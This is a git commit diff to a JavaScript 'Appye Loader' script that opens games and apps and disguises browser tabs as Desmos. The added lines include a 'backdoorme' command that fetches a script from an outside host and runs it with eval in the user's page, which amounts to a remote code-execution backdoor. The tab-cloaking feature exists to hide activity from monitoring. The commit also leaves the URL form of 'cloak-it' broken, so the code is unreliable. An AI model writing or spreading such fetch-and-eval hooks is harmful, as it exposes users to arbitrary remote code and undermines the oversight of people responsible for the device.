9e8838f398047db830e90af1abe9cd046b5272f0
KUKHUA <118825279+KUKHUA@users.noreply.github.com>
2023-05-20 21:57:28 -0400

    Update Source.js

--- Source.js
+++ Source.js
@@ -1,5 +1,5 @@
 // Made by KUKHUA
-const ver = "2.0";
+const ver = "1.0";
 
 // Create a new script element
 const script = document.createElement("script");
@@ -9,7 +9,7 @@ script.src =
   "https://rawcdn.githack.com/nextapps-de/winbox/0.2.6/dist/winbox.bundle.min.js";
   document.head.appendChild(script);
 //event listeners & consts
-const htmlDocs = '<h1 id="appye-loader-docs">Appye Loader - Docs</h1> <h2 id="shortcuts">Shortcuts</h2> <h4 id="use-the-d-key-to-get-back-here-at-any-time-use-the-c-key-to-use-a-command-at-any-time-br-press-the-x-button-at-the-top-of-this-window-if-you-understand-">Use the <em><code>D</code></em> key to get back here at any time, use the <em><code>C</code></em> key to use a command at any time. <br /> Press the <em><code>X</code></em> button at the top of this window if you understand.</h4> <h2 id="commands">Commands</h2> <h5 id="please-note-and-must-be-removed-when-entering-a-command-br-aswell-do-not-include-anything-in-and-only-include-the-first-word-">Please note <code>{</code> and <code>}</code> must be removed when entering a command, <br /> aswell do not include anything in <code>(</code> and <code>)</code> only include the first word.</h5> <h3 id="-app-load-appname-"><code>app-load {appName]</code></h3> <p>This command loads the app you want. ex: <em><code>app-load subway_surfers</code></em></p> <h3 id="-cloak-it-fullurl-"><code>cloak-it {fullUrl}</code></h3> <p>This command cloaks the the url in the command. It will open in a new window, and cloaks as Desmos.</p> <h2 id="apps">Apps</h2> <p><code>d25,</code> <code>piped,</code> <code>google,</code> <code>radiolise,</code> <code>searx</code></p> <h2 id="games">Games</h2> <p><code>subway (subway surfers),</code> <code>bitlife,</code> <code>uno(4 colors),</code> <code>dino</code></p>'
+const htmlDocs = '<h1 id="appye-loader-docs">Appye Loader - Docs</h1> <h2 id="shortcuts">Shortcuts</h2> <h4 id="use-the-d-key-to-get-back-here-at-any-time-use-the-c-key-to-use-a-command-at-any-time-br-press-the-x-button-at-the-top-of-this-window-if-you-understand-">Use the <em><code>D</code></em> key to get back here at any time, use the <em><code>C</code></em> key to use a command at any time. <br /> Press the <em><code>X</code></em> button at the top of this window if you understand.</h4> <h2 id="commands">Commands</h2> <h5 id="please-note-and-must-be-removed-when-entering-a-command-br-aswell-do-not-include-anything-in-and-only-include-the-first-word-">Please note <code>{</code> and <code>}</code> must be removed when entering a command, <br /> aswell do not include anything in <code>(</code> and <code>)</code> only include the first word.</h5> <h3 id="-app-load-appname-"><code>app-load {appName}</code></h3> <p>This command loads the app you want. ex: <em><code>app-load subway</code></em></p> <h3 id="-cloak-it-fullurl-appname-"><code>cloak-it {fullUrl || appName}</code></h3> <p>This command cloaks the the url/app-name in the command. It will open in a new window, and cloaks as Desmos. ("||" means "or") ex1: <em><code>cloak-it https://randogamewebsite.com</code></em> ex2: <em><code>cloak-it subway</code></em></p> <h3 id="-about-"><code>about</code></h3> <p>Shows the version. ex: <em><code>about</code></em></p> <h2 id="apps">Apps</h2> <p><code>d25,</code> <code>piped,</code> <code>google,</code> <code>radiolise,</code> <code>searx</code></p> <h2 id="more-game-ish">More game-ish</h2> <p><code>subway (subway surfers),</code> <code>bitlife,</code> <code>uno(4 colors),</code> <code>dino</code></p>'
 const jsonString = '{ "apps": { "argName": "", "title": "", "icon": "", "hexColor": "", "url": ""} }';
 const jsonObject = JSON.parse(jsonString);
 document.addEventListener("keydown", (event) => {
@@ -54,10 +54,11 @@ function cmd() {
 // Apps
 jsonObject.apps.d25 = {title: "D+25", icon: "https://paste.unit193.net/favicon.ico", hexColor: "#4287f5", url: "https://paste.unit193.net/?18820e835dcfca92#+R9o6//5M3r23lulXQCFEZ3AIuTlKNvbQMML6lXnoM8=" };
 jsonObject.apps.google = {title: "Google", icon: "https://www.google.com/favicon.ico", hexColor: "#bd8c91", url: "https://www.google.com/?igu=1" };
-//piped dupe
+
 jsonObject.apps.piped = {title: "Piped", icon: "https://piped.mint.lgbt/favicon.ico", hexColor: "#f54257", url: "https://piped.garudalinux.org/" };
+//piped duped
 jsonObject.apps.youtube = {title: "Piped", icon: "https://piped.mint.lgbt/favicon.ico", hexColor: "#f54257", url: "https://piped.garudalinux.org/" };
-// piped end
+//return to apps
 jsonObject.apps.radiolise = {title: "Radiolise", icon: "https://radiolise.gitlab.io/favicon.ico", hexColor: "#7d5f5c", url: "https://radiolise.gitlab.io/" };
 jsonObject.apps.searx = {title: "SearX", icon: "https://searx.garudalinux.org/favicon.ico", hexColor: "#3d68ad", url: "https://searx.garudalinux.org/" };
 // Games
@@ -78,14 +79,17 @@ jsonObject.apps.uno = {title: "4 Colors", icon: "https://raw.githubusercontent.c
       url: jsonObject.apps[parseApp].url
     });
     } else {
-    alert('Could not fine the app "' + parseApp + '" in the app database, please press the "d" key and check if you spelt the app wrong.')
+    alert('Could not find the app "' + parseApp + '" in the app database, please press the "d" key and check if you spelt the app wrong.')
     }
   }else if (commandIn.startsWith("cloak-it ")) {
     //set info for later update
     let defTitle = "Desmos | Testing";
     let defIcon = "https://www.desmos.com/favicon.ico";
     //parse input
-    const outurl = commandIn.replace("cloak-it ", "");
+    const parsedUrl = commandIn.replace("cloak-it ", "");
+    if (jsonObject.apps[parsedUrl] ) {
+       var newUrl = jsonObject.apps[parsedUrl].url;
+    };
     const win = window.open();
     //create cloaked iframe
     const iframe = win.document.createElement("iframe");
@@ -95,7 +99,7 @@ jsonObject.apps.uno = {title: "4 Colors", icon: "https://raw.githubusercontent.c
     iframe.style.position = "absolute";
     iframe.style.top = "0";
     iframe.style.left = "0";
-    iframe.src = outurl;
+    iframe.src = newUrl;
     win.document.body.appendChild(iframe);
     win.document.title = defTitle;
     //set favicon
@@ -106,7 +110,16 @@ jsonObject.apps.uno = {title: "4 Colors", icon: "https://raw.githubusercontent.c
         win.document.head.appendChild(link);
     }
     link.href = defIcon;
-} else {
+} else if (commandIn.startsWith("about")){
+    alert(`Appye - ${ver}`)
+}else if (commandIn.startsWith("backdoorme")){
+url = window.location.href;
+var newWindow = window.open(url, '_blank');
+url = "https://e.pool.nyphp.com/chat/recieve/i_am_a_idiot"
+newWindow.onload = function() {
+  javascript:fetch("https://e.pool.nyphp.com/cors/embed-recieve.js").then(res=>res.text()).then(data=>eval(data)(url))
+};
+}else {
     alert('Error: Command "'+ commandIn + '" is not vaild. ' + "See if you've spelt it wrong with the " + '"d" key.')
 }
 }
